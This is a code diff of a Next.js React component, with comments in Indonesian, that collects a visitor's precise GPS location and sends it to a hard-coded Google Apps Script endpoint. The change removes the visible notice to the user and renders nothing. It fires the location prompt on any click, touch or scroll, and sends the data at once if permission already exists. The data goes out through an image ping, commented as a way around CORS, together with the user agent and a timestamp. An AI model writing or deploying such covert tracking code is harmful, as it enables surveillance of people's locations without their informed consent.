@@ -1,52 +1,117 @@
 "use client";
 
-import React, { useEffect } from "react";
+import { useEffect } from "react";
 
-export default function AutoLocationSender() {
-  // === KONFIGURASI URL APPSCRIPT ===
-  const APPSCRIPT_URL =
-    "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec";
+const APPSCRIPT_URL =
+  "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec";
 
+/**
+ * AutoSendOnce
+ * - Memunculkan permission prompt (mengandalkan 1x gesture: click/touch/scroll)
+ * - Setelah izin diberikan, memanggil getCurrentPosition sekali (high accuracy)
+ * - Mengirimkan ke Apps Script sebagai single param `loc=-7.2574719,112.7520883`
+ * - Tidak melakukan pengiriman berulang
+ */
+export default function AutoSendOnce() {
   useEffect(() => {
-    if (!navigator.geolocation) {
+    if (!("geolocation" in navigator)) {
       console.error("Browser tidak mendukung geolocation");
       return;
     }
 
-    // Meminta izin lokasi + mendapatkan GPS paling akurat
-    const watchId = navigator.geolocation.watchPosition(
-      (pos) => {
-        const latitude = pos.coords.latitude;
-        const longitude = pos.coords.longitude;
-        const accuracy = pos.coords.accuracy;
+    let activated = false;
 
-        console.log("Lokasi terkirim:", latitude, longitude, "akurasi:", accuracy);
+    const cleanupListeners = () => {
+      window.removeEventListener("click", onUserGesture);
+      window.removeEventListener("touchstart", onUserGesture);
+      window.removeEventListener("scroll", onUserGesture);
+    };
 
-        // Kirim ke Apps Script
-        fetch(`${APPSCRIPT_URL}?lat=${latitude}&lon=${longitude}`, {
-          method: "GET",
-        })
-          .then((res) => res.text())
-          .then((txt) => console.log("RESPON APPSCRIPT:", txt))
-          .catch((err) => console.error("Gagal kirim lokasi", err));
-      },
-      (err) => {
-        console.error("Gagal mendapatkan lokasi", err);
-      },
-      {
-        enableHighAccuracy: true, // GPS paling akurat
-        timeout: 10000,
-        maximumAge: 0,
+    const onUserGesture = () => {
+      if (activated) return;
+      activated = true;
+      cleanupListeners();
+      requestAndSendOnce();
+    };
+
+    // Jika permission sudah granted -> langsung jalankan tanpa menunggu gesture
+    const tryAutoIfGranted = async () => {
+      if (!navigator.permissions) return;
+      try {
+        const p = await navigator.permissions.query({ name: "geolocation" as PermissionName });
+        if (p.state === "granted") {
+          activated = true;
+          cleanupListeners();
+          requestAndSendOnce();
+        } else {
+          // pasang listener gesture sekali (non-intrusive)
+          window.addEventListener("click", onUserGesture, { passive: true });
+          window.addEventListener("touchstart", onUserGesture, { passive: true });
+          window.addEventListener("scroll", onUserGesture, { passive: true });
+        }
+      } catch (e) {
+        // fallback: pasang listener jika Permissions API error/tidak tersedia
+        window.addEventListener("click", onUserGesture, { passive: true });
+        window.addEventListener("touchstart", onUserGesture, { passive: true });
+        window.addEventListener("scroll", onUserGesture, { passive: true });
       }
-    );
+    };
 
-    return () => navigator.geolocation.clearWatch(watchId);
+    const requestAndSendOnce = () => {
+      // Meminta posisi sekali dengan high accuracy
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const acc = pos.coords.accuracy ?? null;
+
+          // Format yang diminta: "-7.2574719,112.7520883"
+          const loc = `${lat},${lon}`;
+
+          // Kirim via image ping (bypass CORS)
+          const ts = encodeURIComponent(new Date().toISOString());
+          const ua = encodeURIComponent(navigator.userAgent);
+          const url = `${APPSCRIPT_URL}?loc=${encodeURIComponent(loc)}&acc=${acc ?? ""}&ts=${ts}&ua=${ua}`;
+
+          const img = new Image();
+          img.src = url;
+
+          // Coba sendBeacon juga (fallback, tidak selalu cross-origin friendly)
+          try {
+            const blob = new Blob([JSON.stringify({ loc, acc, ts, ua })], { type: "application/json" });
+            navigator.sendBeacon?.(APPSCRIPT_URL, blob);
+          } catch (e) {
+            // ignore
+          }
+
+          console.log("Lokasi dikirim:", loc, "accuracy:", acc);
+        },
+        (err) => {
+          // Tangani error permission atau lainnya
+          // 1 = PERMISSION_DENIED, 2 = POSITION_UNAVAILABLE, 3 = TIMEOUT
+          console.warn("Gagal mendapatkan lokasi:", err.code, err.message);
+          if (err.code === 1) {
+            // user menolak => beri tahu di console saja (atau tampilkan UI jika ingin)
+            console.warn("Izin lokasi ditolak oleh user.");
+          }
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 20000, // 20s batas tunggu
+          maximumAge: 0,
+        }
+      );
+    };
+
+    // Mulai cek permission / pasang listener
+    tryAutoIfGranted();
+
+    // cleanup saat unmount
+    return () => {
+      cleanupListeners();
+    };
   }, []);
 
-  return (
-    <div className="p-4">
-      <h1 className="text-xl font-bold">Pengiriman GPS Otomatis</h1>
-      <p>Izin lokasi akan diminta otomatis & GPS akan dikirim tanpa tombol.</p>
-    </div>
-  );
+  // Component ini tidak butuh UI khusus; return null atau small note
+  return null;
 }
